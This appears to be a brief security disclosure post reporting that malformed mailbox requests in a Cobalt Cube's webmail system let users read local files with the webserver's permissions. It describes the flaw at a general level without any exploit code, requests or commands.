I just got a new Cobalt Cube today and I have been poking around at it
for security issues... I noticed this minor issue in the webmail system.
Your 
users are not aloud to have shell access by default however if they
malform their mailbox requests they can read local files with the perms
of the webserver. If your users have shell access they will not really
be gaining anything however this could be used to remotely gather
information for a future attack.
